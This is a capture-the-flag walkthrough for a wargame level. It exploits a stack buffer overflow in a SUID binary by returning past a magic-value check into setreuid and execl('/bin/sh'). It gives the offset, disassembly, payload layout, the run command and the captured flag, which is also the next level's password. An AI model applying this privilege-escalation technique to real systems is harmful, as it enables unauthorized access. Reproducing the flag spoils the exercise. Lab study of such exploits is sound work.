# level01 — walkthrough

**Binary:** `/home/level01/ono` (SUID `flag01`, x86-64)
**Goal:** read `/home/flag01/.pass`

## 1. Recon
```
checksec: No canary, No PIE (0x400000), ASLR off.
```
`run_diagnostic()`:
```c
char op_id[OPERATOR_LEN];          // 64 bytes
read(STDIN_FILENO, op_id, 256);    // reads up to 256 -> overflow
```
And an unused win function:
```c
static void maintenance_exec(long code) {
    if (code == 0xdeadbeefL) {
        setreuid(geteuid(), geteuid());
        execl("/bin/sh", "sh", NULL);
    }
}
```

## 2. The bug
`read()` writes up to 256 bytes into a 64-byte buffer, overrunning the saved
return address of `run_diagnostic`. `read()` is binary-safe (it does not stop
at newlines/NULs), so the payload has no bad-byte constraints.

## 3. Offset
`cyclic(200)` → crash → `cyclic_find` gives **72** (64 + 8 saved rbp).

## 4. Reaching the shell without controlling rdi
`maintenance_exec` takes `code` in rdi and there is no `pop rdi; ret` gadget in
the binary. But we do not need the argument at all — we return **past** the
check. Disassembly:
```
401287:  mov  eax, 0xdeadbeef
40128c:  cmp  QWORD PTR [rbp-0x18], rax
401290:  jne  4012ca                  ; skip if != 0xdeadbeef
401292:  call geteuid ...             ; <-- return HERE
         ... setreuid ... execl("/bin/sh")
```
Returning straight to **0x401292** runs the setreuid + `execl("/bin/sh")` block.
`setreuid(euid,euid)` keeps the flag01 privilege before the shell.

## 5. Payload
```
[ 'A'*72 ][ p64(0x401292) ]
```

## 6. Run
```
python3 exploit.py > payload
(cat payload; sleep 1; echo 'cat /home/flag01/.pass') | ./ono
-> 3309s5bx9kagi0z0qt0erxvivievlh86
```

**flag01 = `3309s5bx9kagi0z0qt0erxvivievlh86`** (SSH password for level02)
